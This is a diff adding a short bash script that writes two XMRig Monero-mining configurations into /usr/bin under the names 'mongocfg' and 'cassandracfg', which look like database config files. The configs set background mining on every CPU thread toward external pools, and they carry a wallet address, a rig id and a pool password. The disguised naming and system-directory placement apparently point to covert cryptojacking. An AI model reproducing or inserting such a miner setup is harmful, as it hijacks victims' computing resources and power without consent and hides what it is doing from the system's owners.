@@ -1,0 +1,57 @@
+#/bin/bash
+cd /usr/bin
+
+echo '{
+    "autosave": false,
+    "background": true,
+    "colors": false,
+    "randomx": {
+        "init": -1
+    },
+    "cpu": {
+        "enabled": true,
+        "rx": [-1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1]
+    },
+    "donate-level": 1,
+    "pools": [
+        {
+            "enabled": true,
+            "algo": "rx/0",
+            "url": "xmr.f2pool.com:13531",
+            "user": "86LPjSAKKAkDPnfTMhvr6z7qftxG9P9DU5BpqQyVfwzcBGoCWrRJsDheBKQBD4LTuEUmq16V887edEutJaXf8MHYPuFNtaL",
+            "rig-id": "mushroom1319"
+        }
+    ],
+    "print-time": 3600,
+    "retries": 4320,
+    "retry-pause": 20
+}' > mongocfg
+
+
+echo '{
+    "autosave": false,
+    "background": true,
+    "colors": false,
+    "randomx/epic": {
+        "init": -1
+    },
+    "cpu": {
+        "enabled": true,
+        "randomx/epic": [-1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1]
+    },
+    "donate-level": 1,
+    "pools": [
+        {
+            "enabled": true,
+            "algo": "randomx/epic",
+            "url": "51pool.online:3416",
+            "user": "mushroom1319;w1",
+            "pass": "jl09mro5da0g"
+        }
+    ],
+    "print-time": 3600,
+    "user-agent": "xmrig/v-epic-0.0.1",
+    "retries": 4320,
+    "retry-pause": 20
+}' > cassandracfg
+
